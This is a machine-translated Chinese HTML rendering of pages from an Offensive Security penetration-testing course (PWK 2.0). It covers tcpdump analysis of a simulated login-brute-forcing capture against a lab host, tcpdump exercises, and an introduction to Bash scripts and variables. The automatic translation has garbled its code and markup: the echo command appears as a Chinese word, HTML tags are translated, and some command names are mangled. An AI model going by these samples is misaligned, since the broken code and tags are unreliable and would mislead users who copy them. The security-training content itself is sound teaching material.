<div style="position:absolute;top:122539;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="104"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 104 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:122572;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:123649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:123649;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:123649;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">104</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：Apache/2.2.20 (Ubuntu)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:122684;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位置：http://admin.megacorpone.com:81/admin/</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变化：接受编码</font></font></nobr></div>
<div style="position:absolute;top:122718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容长度：333</font></font></nobr></div>
<div style="position:absolute;top:122736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：文本/html；</font><font style="vertical-align: inherit;">字符集=iso-8859-1</font></font></nobr></div>
<div style="position:absolute;top:122769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</font></font></nobr></div>
<div style="position:absolute;top:122786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;&lt;头&gt;</font></font></nobr></div>
<div style="position:absolute;top:122803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;title&gt; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">301 永久移动</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/title&gt;</font></font></nobr></div>
<div style="position:absolute;top:122820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/head&gt;&lt;body&gt;</font></font></nobr></div>
<div style="position:absolute;top:122837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;h1&gt;永久移动&lt;/h1&gt;</font></font></nobr></div>
<div style="position:absolute;top:122854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;文档已移至&lt;a href="http://admin.megacorpone.com:81/admin/"&gt;此处&lt;/a&gt;。&lt;/a&gt;</font></font></nobr></div>
<div style="position:absolute;top:122871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font></nobr></div>
<div style="position:absolute;top:122888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;小时&gt;</font></font></nobr></div>
<div style="position:absolute;top:122905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;address&gt;Apache/2.2.20 (Ubuntu) 服务器在 admin.megacorpone.com 端口 81&lt;/address&gt;</font></font></nobr></div>
<div style="position:absolute;top:122922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;&lt;/html&gt;</font></font></nobr></div>
<div style="position:absolute;top:122942;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 133 - 使用 tcpdump 和一些高级过滤</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这里，我们的故事变得更加清晰。</font><font style="vertical-align: inherit;">我们看到大量失败的尝试</font></font></nobr></div>
<div style="position:absolute;top:122990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对 /admin 目录进行身份验证，这导致 HTTP 401 回复，而最后一次尝试</font></font></nobr></div>
<div style="position:absolute;top:123009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录似乎已成功，因为服务器回复了 HTTP 301 响应。</font><font style="vertical-align: inherit;">好像有人</font></font></nobr></div>
<div style="position:absolute;top:123029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得了对 megacorpone 的一台服务器的访问权！</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123063;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcpdump</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新创建捕获端口 110 上流量的 Wireshark 练习。</font></font></nobr></div>
<div style="position:absolute;top:123122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-X</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志查看数据包的内容。</font><font style="vertical-align: inherit;">如果数据被截断，请调查</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b></nobr></div>
<div style="position:absolute;top:123141;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志可能会有所帮助。</font></font></nobr></div>
<div style="position:absolute;top:123170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 在password_cracking_filtered.pcap 文件中找到所有'SYN'、'ACK' 和'RST' 数据包。</font></font></nobr></div>
<div style="position:absolute;top:123198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. tcpdump 中提供了另一种语法，您可以在其中使用更用户友好的过滤器来</font></font></nobr></div>
<div style="position:absolute;top:123217;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅显示 ACK 和 PSH 数据包。</font><font style="vertical-align: inherit;">通过搜索在 tcpdump 手册中探索此语法</font></font></nobr></div>
<div style="position:absolute;top:123236;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于“tcpflags”。</font><font style="vertical-align: inherit;">使用此语法提出一个等效的显示过滤器来过滤 ACK 和</font></font></nobr></div>
<div style="position:absolute;top:123256;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PSH 数据包。 </font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.6 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们展示了每个渗透测试者工具包中的一些实用工具</font></font></nobr></div>
<div style="position:absolute;top:123354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tcpdump</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这些工具可以在很多方面提供帮助</font></font></nobr></div>
<div style="position:absolute;top:123373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试期间，特别是当目标缺乏专门的工具或我们需要时</font></font></nobr></div>
<div style="position:absolute;top:123393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转移小工具以扩大我们在目标网络上的立足点。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:123727;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="105"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 105 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:123760;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:124837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:124837;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:124837;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">105</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:123850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.6.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. Bash 脚本</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GNU Bourne-Again Shell (Bash) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个强大的工作环境和脚本引擎。</font><font style="vertical-align: inherit;">一种</font></font></nobr></div>
<div style="position:absolute;top:123940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">称职的安全专家巧妙地利用 Bash 脚本来简化和自动化</font></font></nobr></div>
<div style="position:absolute;top:123959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多 Linux 任务和程序。</font><font style="vertical-align: inherit;">在本模块中，我们将介绍 Bash 脚本并探索</font></font></nobr></div>
<div style="position:absolute;top:123979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几个实际场景。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:124016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.1 Bash 脚本介绍</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本是一个纯文本文件，其中包含一系列命令，这些命令就像</font></font></nobr></div>
<div style="position:absolute;top:124077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在终端提示下输入。</font><font style="vertical-align: inherit;">一般来说，Bash 脚本有一个可选的扩展名</font></font></nobr></div>
<div style="position:absolute;top:124096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.sh（为了便于识别），以</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开头，</font><font style="vertical-align: inherit;">并且必须设置可执行权限</font></font></nobr></div>
<div style="position:absolute;top:124115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在它们被执行之前。</font><font style="vertical-align: inherit;">让我们从一个简单的“Hello World”Bash 脚本开始：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./hello-world.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:124167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:124184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Hello World Bash 脚本</font></font></nobr></div>
<div style="position:absolute;top:124201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声“世界你好！”</font></font></nobr></div>
<div style="position:absolute;top:124221;left:301"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 134 - 创建一个简单的“Hello World”Bash 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个脚本有几个值得解释的组件：</font></font></nobr></div>
<div style="position:absolute;top:124283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:124283;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 行：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#! </font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shebang</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且被 Bash 解释器忽略。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:124302;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二部分</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/bash</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font><font style="vertical-align: inherit;">解释器</font><font style="vertical-align: inherit;">的绝对路径</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">112</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，用于运行</font></font></nobr></div>
<div style="position:absolute;top:124321;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本。</font><font style="vertical-align: inherit;">这就是使它成为“Bash 脚本”而不是另一种类型的 shell 脚本的原因，例如</font></font></nobr></div>
<div style="position:absolute;top:124341;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，“C Shell 脚本”。</font></font></nobr></div>
<div style="position:absolute;top:124369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:124369;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 2 行：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于添加注释，因此其后的所有文本都将被忽略。</font></font></nobr></div>
<div style="position:absolute;top:124398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:124398;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 行：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo “Hello World！” </font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux 命令实用程序将给定的字符串打印到</font></font></nobr></div>
<div style="position:absolute;top:124417;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端，在这种情况下是“Hello World！”。</font></font></nobr></div>
<div style="position:absolute;top:124450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们使脚本可执行并运行它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x hello-world.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:124519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./hello-world.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:124536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你好，世界！</font></font></nobr></div>
<div style="position:absolute;top:124555;left:301"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 135 - 运行一个简单的“Hello World”Bash 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搭配chmod</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，与沿</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ X</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于使脚本可执行文件，并</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./hello-</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:124604;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">world.sh</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于实际运行它。</font><font style="vertical-align: inherit;">该</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">符号可能看起来混乱，但这个仅仅是一个路径</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示此脚本位于当前目录中的符号。</font><font style="vertical-align: inherit;">每当我们输入命令时，Bash</font></font></nobr></div>
<div style="position:absolute;top:124642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试在存储在</font><font style="vertical-align: inherit;">名为</font><i><font style="vertical-align: inherit;">PATH</font></i><font style="vertical-align: inherit;">的变量</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">113</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中的一系列目录中找到它</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">由于我们的主目录</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:124727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2017），http://www.gnu.org/software/bash/</font></font></font></nobr></div>
<div style="position:absolute;top:124747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Shebang_(Unix)</font></font></font></nobr></div>
<div style="position:absolute;top:124767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">112 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 信息项目，2005 年），http://www.linfo.org/absolute_pathname.html</font></font></font></nobr></div>
<div style="position:absolute;top:124787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">113 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（O'Reilly Media, Inc.，1998 年），https://www.oreilly.com/library/view/learning-the-bash/1565923472/ch04s02.html。</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:124915;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="106"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 106 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:124948;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:126025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:126025;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:126025;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">106</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不包含在该变量中，我们必须使用</font><font style="vertical-align: inherit;">Bash 脚本</font><font style="vertical-align: inherit;">的相对路径</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">114</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">才能使用 Bash</font></font></nobr></div>
<div style="position:absolute;top:125063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“找到它”并运行它。</font></font></nobr></div>
<div style="position:absolute;top:125096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经创建了我们的第一个 Bash 脚本，让我们更详细地探索 Bash。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:125133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2 变量</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量被命名为临时存储数据的地方。</font><font style="vertical-align: inherit;">我们可以设置（或“声明”）一个变量，它</font></font></nobr></div>
<div style="position:absolute;top:125194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为其分配一个值，或读取一个变量，这将“扩展”或“解析”为其存储的值。</font></font></nobr></div>
<div style="position:absolute;top:125227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过多种方式声明变量值。</font><font style="vertical-align: inherit;">最简单的方法是直接设置值</font></font></nobr></div>
<div style="position:absolute;top:125246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用简单的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name=value</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声明。</font><font style="vertical-align: inherit;">请注意，“=”符号前后没有空格：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:125281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first_name=好</font></font></font></b></nobr></div>
<div style="position:absolute;top:125301;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 136 - 声明一个简单的变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声明一个变量是没有意义的，除非我们可以引用它。</font><font style="vertical-align: inherit;">为此，我们在变量前加上</font></font></nobr></div>
<div style="position:absolute;top:125349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“$”字符。</font><font style="vertical-align: inherit;">每当 Bash 在命令中遇到此语法时，它都会替换变量</font></font></nobr></div>
<div style="position:absolute;top:125369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行前的名称及其值（“扩展”变量）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:125404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first_name=好</font></font></font></b></nobr></div>
<div style="position:absolute;top:125437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">last_name=黑客</font></font></font></b></nobr></div>
<div style="position:absolute;top:125472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $first_name $last_name</font></font></font></b></nobr></div>
<div style="position:absolute;top:125488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好黑客</font></font></nobr></div>
<div style="position:absolute;top:125508;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 137 - 声明和显示我们自己的变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量名可以是大写、小写或两者的混合。</font><font style="vertical-align: inherit;">然而，Bash 是这样的——</font></font></nobr></div>
<div style="position:absolute;top:125556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">敏感所以我们在声明和扩展变量时必须保持一致。</font><font style="vertical-align: inherit;">另外，还不错</font></font></nobr></div>
<div style="position:absolute;top:125576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习使用描述性变量名，这使我们的脚本更容易阅读和</font></font></nobr></div>
<div style="position:absolute;top:125595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">维持。</font></font></nobr></div>
<div style="position:absolute;top:125628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，Bash 以特定方式解释某些字符。</font><font style="vertical-align: inherit;">例如，这个声明</font></font></nobr></div>
<div style="position:absolute;top:125648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演示了不正确的多值变量声明：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:125682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">greeting=Hello World</font></font></font></b></nobr></div>
<div style="position:absolute;top:125699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bash：世界：找不到命令</font></font></nobr></div>
<div style="position:absolute;top:125719;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 138 - 尝试为变量分配一个复数值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
